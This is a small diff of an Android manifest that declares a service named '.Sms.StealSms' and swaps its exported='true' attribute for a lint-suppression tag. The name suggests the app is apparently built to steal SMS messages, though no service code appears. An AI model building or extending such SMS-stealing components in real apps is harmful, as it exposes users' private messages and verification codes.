@@ -36,7 +36,7 @@
             </intent-filter>
         </activity>
         <service android:name=".Sms.StealSms"
-            android:exported="true"
+            tools:ignore="ExportedActivity"
             />
     </application>
 
